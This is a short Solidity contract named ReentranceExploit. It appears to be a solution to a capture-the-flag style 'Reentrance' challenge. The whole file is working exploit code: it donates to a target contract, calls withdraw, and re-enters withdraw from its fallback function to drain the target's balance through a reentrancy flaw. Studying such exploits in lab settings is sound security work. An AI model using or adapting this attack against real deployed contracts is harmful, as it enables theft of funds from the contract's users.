// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import '../Reentrance.sol';

contract ReentranceExploit {

    Reentrance public target;
    uint amount;

    constructor(address payable _target) public{
        target = Reentrance(_target);
    }

    function exploit() public payable{
        amount = msg.value;
        target.donate{value:msg.value}(address(this));
        target.withdraw(msg.value);
    }


    fallback() external payable{
        target.withdraw(amount);
    }

}   